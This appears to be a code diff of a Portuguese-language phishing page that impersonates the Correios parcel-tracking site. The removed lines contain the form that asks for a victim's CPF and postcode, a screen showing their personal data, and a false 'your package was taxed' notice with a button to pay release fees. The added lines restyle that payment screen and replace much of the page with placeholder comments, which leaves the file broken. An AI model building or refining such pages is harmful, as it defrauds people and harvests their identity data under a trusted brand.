@@ -2,434 +2,115 @@
 <html lang="pt-BR">
 
 <head>
-  <meta charset="UTF-8" />
-  <meta name="viewport" content="width=device-width, initial-scale=1" />
-  <meta http-equiv="X-UA-Compatible" content="ie=edge" />
-  <link rel="stylesheet" href="https://stackpath.bootstrapcdn.com/bootstrap/4.5.2/css/bootstrap.min.css" />
-  <link rel="stylesheet" href="css/app.css" />
-  <link rel="stylesheet" href="css/yellow.css" />
-  <link rel="icon" type="image/x-icon" href="../wp-content/uploads/2024/11/regular_correios-logo-2.png" />
-  <script src="../scripts/utms/latest.js" data-utmify-prevent-subids="" async defer></script>
-  <title>Correios | Rastreio</title>
-
-  <!-- Add Futura font -->
+  <!-- ... (cabeçalho anterior permanece igual) ... -->
   <style>
-    @font-face {
-      font-family: 'Futura No. 2';
-      src: url('https://fonts.cdnfonts.com/css/futura-no-2') format('woff2');
-      font-weight: normal;
-      font-style: normal;
-    }
-  </style>
+    /* ... (outros estilos anteriores permanecem iguais) ... */
 
-  <style>
-    /* ====== Top Bar amarela ====== */
-    #top-bar {
-      background-color: #ffd500;
-      height: 48px;
-      display: flex;
-      justify-content: space-between;
-      align-items: center;
-      padding: 0 15px;
-      font-family: Arial, sans-serif;
-      font-size: 14px;
-      color: #003157;
-      box-sizing: border-box;
-    }
-
-    #top-bar .left-options a {
-      color: #003157;
-      text-decoration: none;
-      font-weight: 600;
-      cursor: pointer;
-    }
-
-    #top-bar .left-options a:hover {
-      text-decoration: underline;
-    }
-
-    #top-bar .right-options {
-      display: flex;
-      align-items: center;
-      gap: 15px;
-    }
-
-    #btn-entrar {
-      display: flex;
-      align-items: center;
-      background: none;
-      border: none;
-      cursor: pointer;
-      font-size: 14px;
-      color: #003157;
-      font-weight: 600;
-      padding: 0;
-    }
-
-    #btn-entrar img {
-      height: 20px;
-      margin-right: 6px;
-      vertical-align: middle;
-    }
-
-    #btn-entrar:hover {
-      text-decoration: underline;
-    }
-
-    #menu-hamburguer {
-      display: inline-block;
-      cursor: pointer;
-      width: 25px;
-      height: 18px;
-      position: relative;
-    }
-
-    #menu-hamburguer span {
-      background: #003157;
-      position: absolute;
-      height: 3px;
-      width: 100%;
-      border-radius: 2px;
-      opacity: 1;
-      left: 0;
-      transition: all 0.3s ease;
-    }
-
-    #menu-hamburguer span:nth-child(1) {
-      top: 0;
-    }
-
-    #menu-hamburguer span:nth-child(2) {
-      top: 7.5px;
-    }
-
-    #menu-hamburguer span:nth-child(3) {
-      top: 15px;
-    }
-
-    /* ====== Logo centralizada na horizontal e alinhada com botão consultar ====== */
-    header {
-      margin-top: 10px;
-      display: flex;
-      justify-content: center;
-      position: relative;
-    }
-
-    header img {
-      height: 40px;
-      display: block;
-    }
-
-    main {
-      max-width: 700px;
-      margin: 2rem auto;
-      padding: 0 1rem;
-      text-align: center;
-      font-family: Arial, sans-serif;
-      color: #003157;
-    }
-
-    /* Centralizar o título Rastreamento */
-    main > h1 {
-      margin-bottom: 1.5rem;
-      font-weight: 700;
-      font-size: 24px;
-      color: #003157;
-    }
-
-    /* Texto "ACOMPANHE SUAS ENCOMENDAS ABAIXO" restaurado */
-    #tela-formulario h5 {
-      text-align: center;
-      font-size: 1.2rem;
-      font-weight: 600;
-      color: #003157;
-      margin-bottom: 1.5rem;
-    }
-
-    /* Formulário com campos e botão centralizados */
-    #tela-formulario form {
-      display: flex;
-      flex-direction: column;
-      align-items: center;
-      gap: 1rem;
-    }
-
-    #tela-formulario span {
-      color: #003157;
-      font-weight: 600;
-      align-self: flex-start;
-      max-width: 600px;
-      text-align: left;
-    }
-
-    /* Inputs centralizados e com largura fixa */
-    input.form-control {
-      max-width: 600px;
-      width: 100%;
-      margin-bottom: 0;
-    }
-
-    /* Botão centralizado */
-    #botao-container {
-      display: flex;
-      justify-content: center;
-      width: 100%;
-      margin-top: 1rem;
-    }
-
-    #consultar-btn {
-      padding: 0.5rem 1.5rem;
-      font-size: 1rem;
-      background-color: #003157;
-      color: white;
-      border: none;
-      border-radius: 5px;
-      cursor: pointer;
-      max-width: 600px;
-      width: 100%;
-    }
-
-    #consultar-btn:hover {
-      background-color: #001a33;
-    }
-
-    /* Tela formulário background */
-    #tela-formulario {
-      background-color: #f0f0f0;
-      padding: 20px;
-      border-radius: 8px;
-      max-width: 700px;
-      margin: 0 auto;
-    }
-
-    /* Resultado */
-    #resultado {
-      background: #f0f0f0;
-      border-radius: 8px;
-      padding: 2rem;
-      font-family: Arial, sans-serif;
-      color: #003157;
-      box-shadow: 0 0 10px rgb(0 0 0 / 0.1);
-      text-align: center;
-      max-width: 700px;
-      margin: 2rem auto;
-      display: none;
-    }
-
-    /* Pagamento */
-    #pagamento {
-      background: #ffffff;
-      border-radius: 8px;
-      padding: 2.5rem;
-      font-family: Arial, sans-serif;
-      text-align: left;
-      max-width: 1000px;
-      margin: 2rem auto;
-      display: none;
-    }
-
-    #resultado h2, #pagamento h2 {
-      font-weight: 700;
-      margin-bottom: 1rem;
-      font-size: 14px;
-    }
-
-    #resultado p, #pagamento p {
-      font-size: 14px;
-      margin: 0.5rem 0;
-      text-align: left;
-    }
-
-    #resultado p span, #pagamento p span {
-      font-weight: 700;
-      color: #003157;
-    }
-
-    /* Alert styles */
-    .alert-title {
-      color: #dc3545;
-      font-weight: bold;
-      font-size: 18px;
-      margin-bottom: 15px;
-      text-align: center;
-      font-family: 'Futura No. 2', sans-serif;
-      font-variant: small-caps;
-      letter-spacing: 0.5px;
-    }
-    
-    .status-label {
-      color: #003157;
-      font-weight: bold;
-      margin-bottom: 5px;
-      text-align: left;
-    }
-    
-    .status-value {
-      color: #D4AF37;
-      font-weight: bold;
-      text-align: left;
-      font-size: 16px;
-      font-family: 'Futura No. 2', sans-serif;
-      font-variant: small-caps;
-      position: relative;
-      padding-left: 20px;
-      margin: 15px 0;
-    }
-    
-    .status-value:before {
-      content: "•";
-      color: #D4AF37;
-      font-size: 24px;
-      position: absolute;
-      left: 0;
-      top: 50%;
-      transform: translateY(-50%);
-    }
-    
-    .normal-text {
-      color: #000000;
-      margin: 15px 0;
-      text-align: left;
-    }
-
-    /* Rua e Bairro vazios */
-    #res-rua,
-    #res-bairro,
-    #pag-rua,
-    #pag-bairro {
-      color: transparent !important;
-      user-select: none;
-      pointer-events: none;
-    }
-
-    /* Prazo para regularização em vermelho */
-    #res-prazo {
-      font-size: 14px;
-      font-weight: 700;
-      color: red !important;
-    }
-
-    /* Botão sim sou eu */
-    #btn-sim-sou-eu, #btn-pagar {
-      margin-top: 1.5rem;
-      padding: 0.6rem 1.5rem;
-      font-size: 1.1rem;
-      background-color: #003157;
-      color: white;
-      border: none;
-      border-radius: 5px;
-      cursor: pointer;
-      transition: background-color 0.3s ease;
-      display: inline-block;
-      max-width: 600px;
-      width: 100%;
-    }
-
-    #btn-sim-sou-eu:hover, #btn-pagar:hover {
-      background-color: #001a33;
-    }
-
-    /* Container para alinhar botão e link */
-    #resultado .btn-container, #pagamento .btn-container {
-      display: flex;
-      flex-direction: column;
-      align-items: center;
-      gap: 0.5rem;
-      margin-top: 1.5rem;
-    }
-
-    /* Link não sou eu abaixo do botão */
-    #nao-sou-eu, #voltar-rastreio {
-      color: gray;
-      text-decoration: underline;
-      cursor: pointer;
-      font-size: 14px;
-      display: inline-block;
-    }
-
-    #nao-sou-eu:hover, #voltar-rastreio:hover {
-      color: #505050;
-    }
-
-    /* Spinner */
-    .spinner {
-      width: 50px;
-      height: 50px;
-      border: 5px solid rgba(0, 0, 0, 0.1);
-      border-top-color: #007bff;
-      border-radius: 50%;
-      animation: spin 1s linear infinite;
-      margin: 20px auto;
-    }
-
-    @keyframes spin {
-      to {
-        transform: rotate(360deg);
-      }
-    }
-
-    /* Caixa image */
+    /* Caixa image - agora como banner */
     .caixa-image {
-      margin: 95px 0;
+      margin: 25px 0;
       text-align: center;
       position: relative;
+      width: 100%;
     }
 
     .caixa-image img {
+      width: 100%;
       max-width: 1000px;
       height: auto;
     }
     
-    /* Texto azul escuro */
-    .blue-dark-text {
-      color: #003157;
-    }
-    
-    /* Status info */
-    .status-info {
-      text-align: left;
-      margin: 30px 0;
-      font-size: 14px;
-      color: #333;
-      line-height: 1.5;
-    }
-    
-    .status-info p {
-      margin: 5px 0;
-    }
-
-    /* Nova imagem de status */
-    .status-image {
-      width: 100%;
-      max-width: 650px;
-      margin: 20px auto;
-      display: block;
-      border-radius: 8px;
-    }
-    
-    /* Payment button container */
-    .payment-button-container {
-      margin: 20px 0;
-    }
-    
-    /* Estilo para o texto sobreposto na imagem da caixa */
+    /* Estilo para o texto sobreposto na imagem da caixa - reduzido 60% e preto */
     .caixa-overlay-text {
       position: absolute;
       top: 50%;
       left: 50%;
       transform: translate(-50%, -50%);
-      color: black;
+      color: black !important; /* Garante texto preto */
       font-weight: bold;
       text-align: left;
       width: 80%;
-      font-size: 6px; /* Reduzido em 50% */
+      font-size: 8px; /* Reduzido ~60% (de 12px para 8px) */
       line-height: 1.4;
     }
     
     .caixa-overlay-text p {
-      margin: 3px 0; /* Reduzido em 50% */
+      margin: 3px 0;
+      color: black !important; /* Garante texto preto */
     }
+
+    /* Estilo para o contêiner pai */
+    .container {
+      position: relative;
+      width: 100%;
+      height: 200px; /* Altura reduzida para banner */
+      background-color: #f0f0f0;
+      border: 1px solid #ddd;
+    }
+
+    .overlay {
+      position: relative;
+      width: 100%;
+      height: 100%;
+      background-image: url('images/Caixa.png');
+      background-size: cover;
+      background-position: center;
+    }
+
+    /* Estilo para o texto centralizado dentro da div */
+    .overlay-text {
+      position: absolute;
+      top: 60%;
+      left: 55%;
+      transform: translate(-50%, -50%);
+      background-color: transparent;
+      color: black !important; /* Garante texto preto */
+      padding: 5px 10px; /* Reduzido */
+      font-size: 8px; /* Reduzido ~60% */
+      text-align: center;
+      border-radius: 5px;
+      width: 300px;
+    }
+
+    .rotate {
+      text-align: start;
+      transform: rotate(2deg);
+      color: black !important; /* Garante texto preto */
+      font-weight: bold;
+      opacity: 0.5;
+      text-shadow: rgba(0, 0, 0, 0.3) 1px 1px 3px, rgba(0, 0, 0, 0.3) -1px -1px 3px, rgba(0, 0, 0, 0.1) 0px 0px 8px;
+      transform-style: preserve-3d;
+      transform: rotateX(1.2deg) rotateY(55deg);
+    }
+  </style>
+</head>
+
+<body>
+  <!-- ... (restante do corpo HTML permanece igual) ... -->
+
+  <!-- Tela Pagamento -->
+  <section id="pagamento">
+    <!-- ... (outras seções permanecem iguais) ... -->
     
+    <section class="mt-3 p-4 w-95 max-w-1000" style="margin:0 auto;">
+      <div class="container">
+        <div class="overlay">
+          <div class="overlay-text">
+            <p class="rotate" style="margin-top:28%; margin-right:0%;"> 
+              NOME: <span id="pag-nome"></span><br>
+              CPF: <span id="pag-cpf"></span>
+            </p>
+            <p class="rotate" style="margin-top:10%;"> 
+              RUA: <br>
+              BAIRRO: <br>
+              CIDADE: <span id="pag-cidade"></span>
+            </p>
+          </div>
+        </div>
+      </div>
+    </section>
+
+  <style>
     /* Estilo para o contêiner pai */
     .container {
       position: relative;
@@ -456,8 +137,8 @@
       transform: translate(-50%, -50%);
       background-color: transparent;
       color: black !important;
-      padding: 5px 10px; /* Reduzido em 50% */
-      font-size: 6px; /* Reduzido em 50% */
+      padding: 10px 20px;
+      font-size: 10px;
       text-align: center;
       border-radius: 5px;
       width: 300px;
@@ -473,228 +154,71 @@
       transform-style: preserve-3d;
       transform: rotateX(1.2deg) rotateY(55deg);
     }
-    
-    /* Estilo para os itens de status */
-    .status-item {
-      display: flex;
-      align-items: flex-start;
-      margin-bottom: 15px;
-      position: relative;
-    }
-    
-    .status-icon {
-      width: 50px;
-      height: 50px;
-      background-color: #f0f0f0;
-      border-radius: 50%;
-      display: flex;
-      justify-content: center;
-      align-items: center;
-      margin-right: 15px;
-      flex-shrink: 0;
-    }
-    
-    .status-content {
-      flex-grow: 1;
-    }
-    
-    .status-title {
-      font-weight: bold;
-      color: #003157;
-      font-size: 13px;
-      margin-bottom: 5px;
-    }
-    
-    .status-desc {
-      color: #333;
-      font-size: 12px;
-    }
-    
-    .status-line {
-      position: absolute;
-      left: 24px;
-      top: -15px;
-      height: 15px;
-      width: 2px;
-      background-color: #FFC40C;
-    }
-    
-    .payment-link {
-      color: #003157 !important;
-      text-decoration: underline;
-    }
   </style>
-</head>
 
-<body>
-  <!-- Faixa amarela topo -->
-  <div id="top-bar">
-    <div class="left-options">
-      <a href="#" id="acessibilidade">Acessibilidade</a>
-    </div>
+  <section class="px-4 py mb-5 w-95 max-w-1000" style="margin:0 auto;">
+    <ul>
+      <li class="d-flex mt-4" style="position: relative">
+        <div class="bg-grey d-flex justify-content-center align-items-center font-size-24 text-blue" style="width:50px;height:50px;border-radius:50%;z-index:100;min-widht:50px">
+          <img src="images/correios-icon-1.png" alt="" width="32">
+        </div>
+        <div class="w-70 d-flex flex-column flex-wrap ml-3 justify-content-center font-verdana">
+          <h5 class="text-blue-dark font-size-13 font-weight-700 p-0 m-0 flex-wrap">
+            Previsão de Entrega
+          </h5>
+          <span class="text-dark font-size-12 flex-wrap">
+            3 dias após o pagamento
+          </span>
+        </div>
+      </li>
 
-    <div class="right-options">
-      <button id="btn-entrar" type="button">
-        <img src="images/entrar.svg" alt="Entrar" />
-        Entrar
-      </button>
+      <li class="d-flex mt-5" style="position: relative">
+        <div style="width:2px;height:120px;background-color:#FFC40C;position:absolute;top:-118px;left:24px"></div>
+        <div class="bg-grey d-flex justify-content-center align-items-center font-size-24 text-blue" style="width:50px;height:50px;border-radius:50%;z-index:100;min-widht:50px">
+          <i class="fal fa-usd-circle"></i>
+        </div>
+        <div class="w-70 d-flex flex-column flex-wrap ml-3 justify-content-center font-verdana">
+          <h5 class="text-blue-dark font-size-13 font-weight-700 p-0 m-0 flex-wrap">
+            Objeto aguardando sua confirmação
+          </h5>
+          <span class="text-dark font-size-12 flex-wrap">
+            em Unidade de Fiscalização em São Paulo  
+            <br>
+          </span>
+          <h5 class="mt-1 text-blue-dark font-size-13 font-weight-700 p-0 m-0 flex-wrap">
+            Realize o pagamento: <a href="#" class="text-blue">Efetuar Pagamento</a>
+          </h5>
+        </div>
+      </li>
 
-      <div id="menu-hamburguer" aria-label="Menu">
-        <span></span>
-        <span></span>
-        <span></span>
-      </div>
-    </div>
+      <li class="d-flex mt-5" style="position: relative">
+        <div style="width:2px;height:120px;background-color:#FFC40C;position:absolute;top:-118px;left:24px"></div>
+        <div class="bg-grey d-flex justify-content-center align-items-center font-size-24 text-blue" style="width:50px;height:50px;border-radius:50%;z-index:100;min-widht:50px">
+          <i class="fal fa-truck"></i>
+        </div>
+        <div class="w-70 d-flex flex-column flex-wrap ml-3 justify-content-center font-verdana">
+          <h5 class="text-blue-dark font-size-13 font-weight-700 p-0 m-0 flex-wrap">
+            Objeto em transferência - por favor aguarde
+          </h5>
+        </div>
+      </li>
+
+      <li class="d-flex mt-5" style="position: relative">
+        <div style="width:2px;height:172px;background-color:#FFC40C;position:absolute;top:-170px;left:24px"></div>
+        <div class="bg-grey d-flex justify-content-center align-items-center font-size-24 text-blue" style="width:50px;height:50px;border-radius:50%;z-index:100">
+          <i class="fal fa-box-alt"></i>
+        </div>
+        <div class="d-flex flex-column ml-3 justify-content-center font-verdana">
+          <h5 class="text-blue-dark font-size-13 font-weight-700 p-0 m-0">Objeto Postado</h5>
+        </div>
+      </li>
+    </ul>
+  </section>
+
+  <div class="btn-container">
+    <a href="#" id="voltar-rastreio">Voltar ao rastreamento</a>
   </div>
-
-  <!-- Logo centralizada -->
-  <header>
-    <img src="images/correios.png" alt="Logo Correios" />
-  </header>
-
-  <main>
-    <h1>Rastreamento</h1>
-
-    <!-- Tela Formulário -->
-    <section id="tela-formulario" class="mt-3 p-4 bg-grey-3 w-95 max-w-1000">
-      <h5>
-        <i class="far fa-exclamation-triangle"></i> ACOMPANHE SUAS ENCOMENDAS ABAIXO
-      </h5>
-
-      <form id="form-rastreamento">
-        <span>Digite o CPF do comprador.</span>
-        <input type="text" name="cpf" class="form-control" placeholder="000.000.000-00" maxlength="14" required id="cpf" />
-
-        <span>Informe o seu CEP abaixo.</span>
-        <input type="text" name="cep" class="form-control" id="cep" placeholder="00000-000" maxlength="9" required />
-
-        <div id="botao-container">
-          <button type="submit" class="btn" id="consultar-btn">Consultar</button>
-        </div>
-
-        <div id="loading-container" style="display: none; text-align: center; margin-top: 20px;">
-          <p style="font-size: 16px; color: #333;">Consultando seus dados...</p>
-          <div class="spinner"></div>
-        </div>
-      </form>
-    </section>
-
-    <!-- Tela Resultado -->
-    <section id="resultado">
-      <h2>Encontramos pedidos retidos em uma de nossas agências. 📦</h2>
-      <p><span>Nome:</span> <span id="res-nome"></span></p>
-      <p><span>CPF:</span> <span id="res-cpf"></span></p>
-      <p><span>Nascimento:</span> <span id="res-nascimento"></span></p>
-      <p><span>CEP:</span> <span id="res-cep"></span></p>
-      <p><span>Rua:</span> <span id="res-rua"></span></p>
-      <p><span>Bairro:</span> <span id="res-bairro"></span></p>
-      <p><span>Cidade:</span> <span id="res-cidade"></span></p>
-      <p><span>Estado:</span> <span id="res-estado"></span></p>
-      <p><span>Prazo para Regularização:</span> <span id="res-prazo"></span></p>
-
-      <div class="btn-container">
-        <button id="btn-sim-sou-eu">SIM SOU EU</button>
-        <a href="#" id="nao-sou-eu">não sou eu</a>
-      </div>
-    </section>
-
-    <!-- Tela Pagamento -->
-    <section id="pagamento">
-      <nav class="d-flex align-items-center flex-wrap mt-4 px-2 font-weight-400 w-95 max-w-1000" style="margin: 0 auto;">
-        <span class="text-blue mr-2">Portal Correios</span>
-        <i class="fal fa-angle-right mr-2"></i>
-        <span class="text-blue mr-2">Rastreamento</span>
-        <i class="fal fa-angle-right mr-2"></i>
-        <span class="text-blue mr-2"><span class="cpf"></span></span>
-      </nav>
-
-      <section class="mt-3 p-4 w-95 max-w-1000" style="margin:0 auto;">
-        <h5 class="text-danger font-weight-700 mb-4">
-          <i class="far fa-exclamation-triangle"></i> SUA ENCOMENDA FOI TRIBUTADA!
-        </h5>
-        <h4 class="text-blue-dark font-size-20 font-weight-700 mt-1 mb-2">
-          STATUS DA ENTREGA: <br>
-        </h4>
-        <h4 class="text-warning font-size-18 font-weight-700 mt-1 mb-2 d-flex align-items-center">
-          <div id="blink" style="width:12px;height:12px;border-radius:50%;" class="mr-2 bg-warning"></div>
-          AGUARDANDO SUA CONFIRMAÇÃO
-        </h4>
-        <h5 id="address" style="color:#555577;">Sua encomenda está retida na agência dos Correios em São Paulo</h5>
-        <p class="mt-4">Para prosseguir com o processo de liberação e entrega da sua encomenda, é necessário efetuar o pagamento das taxas aplicáveis. Por favor, utilize o botão abaixo para realizar o procedimento de forma segura:</p>
-      </section>
-      
-      <div style="padding: 0px 30px 0px 30px;">
-        <button id="btn-pagar" class="btn btn-primary" style="font-size:13px;width: 100%;">CLIQUE AQUI PARA LIBERAÇÃO DO SEU PEDIDO</button>
-      </div>
-
-      <section class="mt-3 p-4 w-95 max-w-1000" style="margin:0 auto;">
-        <div class="container">
-          <div class="overlay">
-            <div class="overlay-text">
-              <p class="rotate" style="margin-top:28%; margin-right:0%;"> 
-                NOME: <span id="pag-nome"></span><br>
-                CPF: <span id="pag-cpf"></span>
-              </p>
-              <p class="rotate" style="margin-top:10%;"> 
-                RUA: <br>
-                BAIRRO: <br>
-                CIDADE: <span id="pag-cidade"></span>
-              </p>
-            </div>
-          </div>
-        </div>
-      </section>
-
-      <section class="px-4 py mb-5 w-95 max-w-1000" style="margin:0 auto;">
-        <ul style="list-style: none; padding-left: 0;">
-          <li class="status-item">
-            <div class="status-icon">
-              <img src="images/correios-icon-1.png" alt="" width="32">
-            </div>
-            <div class="status-content">
-              <div class="status-title">Previsão de Entrega</div>
-              <div class="status-desc">3 dias após o pagamento</div>
-            </div>
-          </li>
-
-          <li class="status-item" style="margin-top: 30px;">
-            <div class="status-line"></div>
-            <div class="status-icon">
-              <i class="fal fa-usd-circle"></i>
-            </div>
-            <div class="status-content">
-              <div class="status-title">Objeto aguardando sua confirmação</div>
-              <div class="status-desc">em Unidade de Fiscalização em São Paulo</div>
-              <div class="status-desc">Realize o pagamento: <a href="#" class="payment-link">Efetuar Pagamento</a></div>
-            </div>
-          </li>
-
-          <li class="status-item" style="margin-top: 30px;">
-            <div class="status-line"></div>
-            <div class="status-icon">
-              <i class="fal fa-truck"></i>
-            </div>
-            <div class="status-content">
-              <div class="status-title">Objeto em transferência - por favor aguarde</div>
-            </div>
-          </li>
-
-          <li class="status-item" style="margin-top: 30px;">
-            <div class="status-line" style="height: 30px;"></div>
-            <div class="status-icon">
-              <i class="fal fa-box-alt"></i>
-            </div>
-            <div class="status-content">
-              <div class="status-title">Objeto Postado</div>
-            </div>
-          </li>
-        </ul>
-      </section>
-
-      <div class="btn-container">
-        <a href="#" id="voltar-rastreio">Voltar ao rastreamento</a>
-      </div>
-    </section>
+</section>
 
     <section class="my-4 w-95 max-w-1000" style="margin: 0 auto;">
       <div>
